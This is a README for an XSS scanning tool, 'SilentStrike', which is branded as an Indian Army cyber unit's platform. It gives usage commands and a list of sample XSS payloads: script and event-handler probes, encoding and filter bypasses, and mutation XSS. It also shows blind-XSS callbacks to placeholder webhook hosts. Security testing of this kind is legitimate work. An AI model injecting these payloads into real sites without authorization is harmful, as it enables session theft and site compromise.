<div align="center">
  <img src="https://img.shields.io/badge/SILENTSTRIKE-XSS%20v3.0-FF9933?style=for-the-badge&logo=python&labelColor=%23138808" alt="SilentStrike">
  <img src="https://img.shields.io/badge/REFLECTED-STRIKE-FF9933?style=for-the-badge&labelColor=white" alt="Reflected">
  <img src="https://img.shields.io/badge/STORED-PERSISTENCE-138808?style=for-the-badge&labelColor=white" alt="Stored">
  <img src="https://img.shields.io/badge/DOM-SINK%20ANALYSIS-FF9933?style=for-the-badge&labelColor=%23138808" alt="DOM">
  <br>
  <img src="https://img.shields.io/github/last-commit/aBadRoy/SilentStrike-XSS?style=flat-square&color=FF9933" alt="Last Commit">
  <img src="https://img.shields.io/github/repo-size/aBadRoy/SilentStrike-XSS?style=flat-square&color=138808" alt="Repo Size">
  <img src="https://img.shields.io/badge/License-MIT-FF9933?style=flat-square" alt="License">
  <img src="https://img.shields.io/badge/Python-3.8%2B-138808?style=flat-square&logo=python" alt="Python">
</div>

```ascii
  ╔══════════════════════════════════════════════════════════════════════════════╗
  ║                                                                              ║
  ║   ███████ ██ ██      ███████ ███    ██ ████████ ███████ ██████  ██ ██   ██ ███████ ║
  ║   ██      ██ ██      ██      ████   ██    ██    ██      ██   ██ ██ ██   ██ ██      ║
  ║   ███████ ██ ██      █████   ██ ██  ██    ██    █████   ██████  ██ ███████ █████   ║
  ║        ██ ██ ██      ██      ██  ██ ██    ██    ██      ██   ██ ██ ██   ██ ██      ║
  ║   ███████ ██ ███████ ███████ ██   ████    ██    ███████ ██   ██ ██ ██   ██ ███████ ║
  ║                                                                              ║
  ╚══════════════════════════════════════════════════════════════════════════════╝
```

<h1 align="center">
  <span style="color:#FF9933">SILENT</span><span style="color:#FFFFFF">STRIKE</span> <sub style="color:#138808">v3.0</sub>
</h1>

<p align="center">
  <strong><span style="color:#FF9933">●</span> <span style="color:#FFFFFF">Indian Army · Cyber Special Forces</span> <span style="color:#138808">●</span></strong><br>
  <em>Advanced XSS Detection & Neutralization Platform</em>
</p>

<p align="center">
  <code>Reflected · Stored · DOM · Blind — 100+ payloads · 20+ contexts · 3-tier detection</code>
</p>

---

## Mission Brief

**SILENTSTRIKE** is a field-grade XSS (Cross-Site Scripting) reconnaissance and exploitation platform developed for the **Indian Army Cyber Special Forces**. Designed for offensive security operators, it combines automated web crawling, multi-vector payload delivery, and intelligent reflection analysis to identify and validate XSS vulnerabilities at scale.

| Operator | aBadRoy |
|----------|---------|
| **Unit** | Indian Army · Cyber Special Forces |
| **Platform** | Python 3.8+ |
| **Classification** | UNCLASSIFIED // FOR AUTHORIZED USE ONLY |

---

## Table of Contents

- [Capabilities](#capabilities)
- [Deployment](#deployment)
- [Engagement Modes](#engagement-modes)
- [Payload Arsenal](#payload-arsenal)
- [Detection Grid](#detection-grid)
- [Field Examples](#field-examples)
- [After-Action Report](#after-action-report)
- [Changelog](#changelog)
- [Disclaimer](#disclaimer)
- [Author](#author)

---

## Capabilities

| Capability | Description |
|------------|-------------|
| **Reflected XSS** | 3 detection methods (direct, normalized, URL-decoded) across 100+ payloads |
| **Stored XSS** | Two-pass verification — inject payload, then probe all pages for persistence |
| **DOM-based XSS** | Static analysis of JavaScript for dangerous sinks (`document.write`, `innerHTML`, `eval`, `location`, etc.) |
| **Blind XSS** | External callback support for out-of-band detection |
| **Context-Aware** | 20+ injection contexts (HTML, attribute, script, URL, style, template, mutation, etc.) |
| **Auto-Crawler** | Discovers URLs, forms, and parameters up to configurable depth |
| **WAF Detection** | Identifies Web Application Firewalls blocking engagement |
| **Encoding Bypass** | Unicode, HTML entity, base64, mixed-case payload variants |
| **Concurrent** | Multi-threaded scanning with configurable thread count |
| **CSP Bypass** | Angular JS sandbox escape and meta refresh payloads |
| **HTML Report** | Professional dark-theme after-action report with vulnerability summary |
| **Headless Ready** | Optional Playwright integration for browser-based execution verification |

---

## Deployment

```bash
# Clone the arsenal
git clone https://github.com/aBadRoy/SilentStrike-XSS.git
cd SilentStrike-XSS

# Arm dependencies
pip install -r requirements.txt

# Optional: headless browser support for execution verification
pip install playwright
playwright install chromium
```

---

## Engagement Modes

```bash
# Basic reflected XSS scan
python scanner.py --url "http://target.com/search?q=test"

# POST scan with session cookie
python scanner.py --url "http://target.com/login" \
  --method POST \
  --cookie "PHPSESSID=abc123; security=low"

# Full sweep: reflected + stored + DOM
python scanner.py --url "http://target.com" \
  --stored --dom \
  --depth 2 --threads 10

# Blind XSS with exfiltration callback
python scanner.py --url "http://target.com/feedback" \
  --method POST \
  --blind "https://your-webhook.io/xss-callback"
```

### Operational Parameters

| Argument | Description | Default |
|----------|-------------|---------|
| `--url` | Target URL **(required)** | — |
| `--method` | HTTP method (`GET`/`POST`) | `GET` |
| `--cookie` | Session cookie string | `None` |
| `--params` | Comma-separated parameters (auto-discovers if omitted) | auto |
| `--threads` | Concurrent strike teams | `5` |
| `--depth` | Recon penetration depth | `1` |
| `--timeout` | Operation timeout (seconds) | `15` |
| `--stored` | Enable stored XSS sweep | `False` |
| `--dom` | Enable DOM XSS analysis | `False` |
| `--blind` | Blind XSS callback URL | `None` |
| `--headless` | Use Playwright for browser verification | `False` |

---

## Payload Arsenal

The platform ships with **100+ warheads** across **20+ categories**:

### HTML Context
`<script>alert(1)</script>` · `<img src=x onerror=alert(1)>` · `<svg/onload=alert(1)>` · `<marquee onstart=alert(1)>` · `<details open ontoggle=alert(1)>` · `<body onload=alert(1)>` · `<input autofocus onfocus=alert(1)>` · `<video><source onerror=alert(1)>` · `<iframe srcdoc="<script>alert(1)</script>">`

### Attribute Context
`" autofocus onfocus=alert(1)` · `javascript:alert(1)` · `" onmouseover=alert(1) x="` · `" style=x:expression(alert(1))`

### Script Context
`</script><script>alert(1)</script>` · `';alert(1);//` · `${alert(1)}` · `1;alert(1)`

### Encoding Bypass
`\u003cscript\u003e` · `&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;` · `%6A%61%76%61%73%63%72%69%70%74:alert(1)` · `<ScRiPt>`

### CSP Bypass
Angular sandbox escape · Meta refresh · CDN-hosted library injection

### Mutation XSS
`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`

---

## Detection Grid

| Level | Method | Description |
|-------|--------|-------------|
| 1 | **Direct match** | Exact payload string found in response body |
| 2 | **Normalized match** | Whitespace-normalized comparison (evades simple filters) |
| 3 | **Decoded match** | URL-decoded response comparison |
| — | **Event analysis** | Checks if event handlers from payload survive in rendered HTML |
| — | **Script analysis** | Detects active script tags with alert/prompt/confirm in response |

---

## Field Examples

```bash
# Google XSS Game — Level 1
python scanner.py --url "https://xss-game.appspot.com/level1/frame?query=test"

# Guestbook stored XSS sweep
python scanner.py --url "http://localhost:8080/guestbook" \
  --method POST \
  --params "name,message" \
  --stored --depth 2

# Full recon + scan on test target
python scanner.py --url "http://testphp.vulnweb.com/search.php" \
  --params "searchFor,category" \
  --dom --threads 8

# Blind XSS with Burp Collaborator exfil
python scanner.py --url "http://target.com/contact" \
  --method POST \
  --params "name,email,message" \
  --blind "http://your-collaborator.burpcollaborator.net/x"
```

---

## After-Action Report

SilentStrike generates a professional **dark-theme HTML report** (`report.html`) after every engagement, featuring:

- Tricolor header (saffron/white/green)
- Vulnerability count and severity breakdown
- Full engagement log with payload, reflection status, and execution verdict
- Compromised assets table with payload previews
- Military-styled After-Action formatting

---

## Changelog

### v3.0 (Current)
- Complete rewrite — codename **SILENTSTRIKE**
- 100+ payloads across 20 injection contexts
- Stored XSS (2-pass verification)
- DOM-based XSS (JavaScript sink analysis)
- Blind XSS with external callback support
- Automatic crawling (URLs, forms, parameters)
- WAF detection
- 3-tier reflection detection
- Multi-threaded scanning
- Professional HTML after-action report
- Indian Army Cyber Special Forces branding

### v1.0 (Original)
- Basic reflected XSS detection
- 3 injection contexts
- Simple HTML report

---

## Disclaimer

> **FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.**
>
> This tool is designed to help security operators identify XSS vulnerabilities in systems they **own** or have **explicit written permission** to test. Unauthorized use against systems without consent is illegal under the **Information Technology Act, 2000** (India) and similar cybercrime laws worldwide.
>
> The author assumes **zero liability** for misuse or damages caused by this software.

---

## Author

**aBadRoy**
- GitHub: [github.com/aBadRoy](https://github.com/aBadRoy)
- Unit: Indian Army · Cyber Special Forces
- Role: Security researcher · Penetration tester · CTF enthusiast

---

<p align="center">
  <span style="color:#FF9933">●</span>
  <span style="color:#FFFFFF">SILENTSTRIKE-XSS v3.0 | Payloads: 100+ | Contexts: 20+ | Detection: 3 methods</span>
  <span style="color:#138808">●</span>
  <br>
  <sub><code>╔═╗╦═╗╦╔╗╔╔═╗╔╦╗╦╔═╗╔═╗╔╦╗  ╔═╗╔═╗╦ ╦╔═╗╦═╗╦╔═╗╦╔═╗╦═╗</code></sub>
</p>
